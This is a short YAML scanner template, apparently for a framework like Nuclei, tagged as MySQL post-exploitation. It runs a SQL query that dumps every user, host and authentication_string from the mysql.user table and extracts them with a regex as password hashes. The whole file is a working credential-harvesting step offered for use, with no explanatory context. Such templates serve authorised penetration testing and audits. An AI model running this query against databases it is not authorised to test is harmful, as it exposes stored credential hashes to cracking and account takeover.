id: mysql-password-hash-extract
service: [mysql]
info:
  name: MySQL Password Hash Extraction
  severity: critical
  tags: mysql,post-exploit,credential,hash

services:
  - ops:
      - db: "SELECT CONCAT('hash=', user, ':', host, ':', authentication_string) FROM mysql.user WHERE authentication_string != '' AND authentication_string IS NOT NULL"
        name: hashes
    matchers:
      - type: word
        part: hashes
        words: ["hash="]
    extractors:
      - type: regex
        name: mysql_password_hashes
        part: hashes
        regex: ['(?m)^hash=(.+)$']
